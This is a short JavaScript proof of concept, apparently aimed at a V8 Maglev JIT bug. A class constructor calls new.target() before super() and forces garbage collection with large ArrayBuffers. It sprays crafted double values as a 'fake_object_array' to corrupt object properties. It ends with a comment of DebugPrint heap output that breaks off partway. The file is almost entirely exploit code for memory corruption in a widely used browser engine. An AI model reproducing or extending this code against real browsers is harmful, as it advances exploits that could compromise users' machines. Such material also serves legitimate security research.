class C2 {
}
var corrupted_arr = [1.1];
var gcSize = 0x4fe00000;
function gc() {
    new ArrayBuffer(gcSize);
}





class C3 extends C2 {
    constructor(obj) {
        try { new.target(); } catch (e) {}
        super();
        const v12 = new Array(32);
        const v14 = new Array(64);
        // %DebugPrint(v12);
            for (let v13 = 0; v13 < 2; v13++) {
                if(!v13) {
                 
                    new Array(256);
                    gc();
                    gc();
                    let fake_object_array = [1.9196715642022913e-307,2261634.5098039214, 3.4644403541910054e-308, 5.743499907618807e-309]; // 0x4141

                } 
                else{
                    obj.c = v12;
                    obj.e = corrupted_arr; 
                    obj.d = v14 ;
                }

            }
        %OptimizeMaglevOnNextCall(C3);
        
       
       
    }
}

let obj = {a: [], c: "a" };

new C3(obj);
new C3(obj);
new C3(obj);
new Array(256);


console.log(obj.d[1]);

/*
done
DebugPrint: 0x9b0000db6c1: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x09b0000daee9 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x09b0000c4b11 <Object map = 0x9b0000c414d>
 - elements: 0x09b0000006cd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x09b0000e1b01 <PropertyArray[3]>
 - All own properties (excluding elements): {
    0x9b000002a41: [String] in ReadOnlySpace: #c: 0x09b0000e227d <FixedDoubleArray[6]> (data field 0), location: in-object
    0x9b000002a51: [String] in ReadOnlySpace: #d: 0x09b0000e228d 


*/